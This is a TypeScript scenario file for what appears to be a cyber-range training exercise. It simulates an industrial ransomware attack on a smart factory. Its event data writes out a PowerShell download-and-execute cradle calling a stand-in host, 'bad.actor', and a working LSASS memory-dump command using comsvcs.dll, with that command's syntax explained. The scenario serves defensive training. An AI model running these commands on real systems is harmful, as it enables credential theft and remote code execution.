/**
 * ransomware.ts
 *
 * Industrial OT Ransomware Attack Scenario definition (LOCKOUT).
 */

import type { AttackScenario } from "./types";
import { SECTOR_TOPOLOGIES, DEFAULT_DECISIONS } from "@/data/scenarios";

const manufacturingTopo = SECTOR_TOPOLOGIES.manufacturing;

export const RANSOMWARE_SCENARIO: AttackScenario = {
  id: "ransomware",
  sector: "manufacturing",
  name: "LOCKOUT",
  code: "LOCKOUT",
  site: "Smart Factory · Line-A",
  byline:
    "OT network encrypted. MES databases locked. Custom ransomware targeting Fanuc & Siemens S7 project files.",
  adversary: "BLACKOUT-RAID",
  protocols: "PROFINET · EtherCAT · OPC-UA · SMB",
  description:
    "Targeted double-extortion OT ransomware campaign encrypting MES databases, robot controllers, and CNC 5-axis mill configurations.",
  duration: 9600,
  severity: "CRITICAL",
  mitreMapping: ["T0865", "T0886", "T0836", "T0855", "T0828"],
  nodes: manufacturingTopo.nodes.map((n) => ({ ...n })),
  edges: manufacturingTopo.edges.map((e) => ({ ...e })),
  decisions: DEFAULT_DECISIONS.map((d) => ({ ...d })),
  events: [
    {
      id: "r-0",
      time: 0,
      type: "network.node",
      tag: "INITIAL ACCESS",
      node: "in",
      title: "Malicious macro executed on Inbound Queue",
      desc: "Inbound Logistics Workstation IN-Q compromised via phishing payload. PsExec used to spread across local subnet.",
      sev: "HIGH",
      lifecycleState: "Initial Access",
      payload: {
        command:
          "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad.actor/lock.ps1')\"",
        output: "[+] Cobalt Strike Beacon loaded. Ransomware stager initialized on IN-Q.",
        logEntry: {
          level: "CRITICAL",
          source: "IN-Q",
          message: "SUSPICIOUS POWERSET EXECUTION: DownloadString stager detected.",
        },
      },
    },
    {
      id: "r-1",
      time: 1100,
      type: "network.node",
      tag: "CREDENTIAL DUMP",
      node: "mes",
      title: "MES Server LSASS memory dumped",
      desc: "Siemens Opcenter MES administrative credentials harvested. Domain admin hashes retrieved.",
      sev: "CRITICAL",
      lifecycleState: "Credential Access",
      payload: {
        command: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
        output: "[+] LSASS dump saved to C:\\windows\\temp\\lsass.dmp. 12 hashes extracted.",
        logEntry: {
          level: "CRITICAL",
          source: "MES",
          message: "LSASS MEMORY DUMP DETECTED from remote process.",
        },
      },
    },
    {
      id: "r-2",
      time: 3200,
      type: "network.node",
      tag: "ENCRYPTION",
      node: "r1",
      title: "Robot R-1 Controller runtime databases encrypted",
      desc: "ABB Robot IRB 6700 trajectory project files encrypted with ChaCha20 extension .LOCKOUT.",
      sev: "CRITICAL",
      lifecycleState: "Impact",
      payload: {
        command: "lockout.exe --path C:\\ABB\\Projects --key 0x89A... --extension .LOCKOUT",
        output:
          "[!] Encrypted 4,892 files in C:\\ABB\\Projects. Ransom note dropped: READ_ME_LOCK.txt",
        logEntry: {
          level: "CRITICAL",
          source: "R-1",
          message:
            "MASS FILE ENCRYPTION IN PROGRESS: 4,892 files appended with .LOCKOUT extension.",
        },
        popupHint: {
          title: "OT RANSOMWARE ENCRYPTION",
          text: "Robot R-1 trajectory files are being encrypted! Isolate node immediately.",
          nodeId: "r1",
        },
      },
    },
    {
      id: "r-3",
      time: 6800,
      type: "network.node",
      tag: "PLC LOCKOUT",
      node: "cnc",
      title: "CNC-7 5-Axis Mill password protection set",
      desc: "Fanuc 31i-B controller protection set to locked. OEM maintenance keys overwritten.",
      sev: "CRITICAL",
      lifecycleState: "Impact",
      payload: {
        command: 'cnc-lock --ip 192.168.30.55 --set-pwd "Rans0m_L0cked_2026!"',
        output:
          "[!] CNC-7 Access Level set to LOCKED (PASSWORD READ/WRITE PROTECTED). OEM key locked.",
        logEntry: {
          level: "CRITICAL",
          source: "CNC-7",
          message: "CNC ACCESS LEVEL CHANGED TO LOCKED. Password protection enabled.",
        },
      },
    },
  ],
  briefing: {
    overview: {
      title: "EXERCISE LOCKOUT · OT DOUBLE-EXTORTION RANSOMWARE",
      summary:
        "Adversary BLACKOUT-RAID deployed custom OT ransomware across Sector 4 Smart Factory. The malware is actively encrypting ABB Robot trajectory files, locking Fanuc CNC 5-axis mills with custom passwords, and exfiltrating engineering blueprints. Your goal is to isolate affected subnets, preserve offline backups, and patch firmware before factory operations are permanently paralyzed.",
      targetInfrastructure: "Smart Factory Manufacturing Line (Sector 4)",
      threatActor: "BLACKOUT-RAID (OT Ransomware Syndicate)",
      businessImpact:
        "Total factory shutdown costing $250,000 per hour of downtime, risk of permanent CNC lockout requiring physical replacement.",
    },
    learningObjectives: [
      "Detect lateral ransomware movement across IT/OT boundaries.",
      "Contain file encryption using network segmentation and air-gaps.",
      "Understand CNC password protection lockouts and mitigation strategies.",
    ],
    scope: {
      included: [
        "✔ LSASS Memory Dumping",
        "✔ SMB/RDP Ransomware Spreading",
        "✔ SCADA Project Encryption",
        "✔ CNC Password Lockout",
      ],
      excluded: ["✖ Paying cryptocurrency ransom", "✖ Cryptographic decryption key cracking"],
    },
    attackIntent: {
      narrative: "BLACKOUT-RAID aims to paralyze production lines and demand a 150 BTC ransom.",
      attackerGoals: [
        "Harvest domain admin credentials.",
        "Encrypt robot trajectory databases.",
        "Lock Fanuc CNC access levels.",
        "Force factory shutdown.",
      ],
    },
    infrastructure: [
      { assetName: "IN-Q", role: "Inbound Queue", purdueLevel: "Level 4", nodeId: "in" },
      { assetName: "MES", role: "Siemens Opcenter", purdueLevel: "Level 3.5", nodeId: "mes" },
      { assetName: "R-1", role: "6-Axis Robot ABB", purdueLevel: "Level 2", nodeId: "r1" },
      { assetName: "CNC-7", role: "5-Axis Mill", purdueLevel: "Level 1", nodeId: "cnc" },
    ],
    mitreOverview: [
      {
        id: "mr1",
        name: "Credential Access",
        techniqueId: "T1003",
        techniqueName: "OS Credential Dumping",
        description: "LSASS dump on MES server.",
        sequenceOrder: 1,
      },
      {
        id: "mr2",
        name: "Impact",
        techniqueId: "T1486",
        techniqueName: "Data Encrypted for Impact",
        description: "Encrypt robot trajectory files.",
        sequenceOrder: 2,
      },
    ],
    controls: [{ name: "Play / Pause", description: "Control simulation timing." }],
    guidedHints: [
      {
        triggerEventId: "r-2",
        hintText: "Mass encryption detected on R-1. Use 'isolate r1' in Kali CLI immediately!",
      },
    ],
    helpContent: {
      idleSuggestionText:
        "Ransomware spreads via open network shares. Isolate infected nodes to stop propagation.",
      commonFAQ: [
        {
          question: "Can I unlock the CNC Mill?",
          answer:
            "Apply a signed patch using 'patch cnc' in Kali CLI to reset CPU security levels.",
        },
      ],
    },
    commandExplanations: [
      {
        command: "rundll32.exe comsvcs.dll, MiniDump lsass.dmp",
        purpose: "Dumps LSASS memory to extract cleartext passwords and hashes.",
        syntax: "rundll32 comsvcs.dll MiniDump <pid> <output>",
        expectedOutput: "LSASS dump saved.",
        attackerIntent: "Harvest administrative credentials.",
        riskLevel: "CRITICAL",
        detectionOpportunities: "EDR alert on comsvcs.dll loading LSASS process.",
        mitreTechnique: "T1003 - Credential Dumping",
      },
    ],
    nodeExplanations: {},
    timelineExplanations: [],
    successCriteria: [
      "Halt ransomware propagation before reaching Level 1 CNC controllers.",
      "Maintain factory operations.",
    ],
  },
};
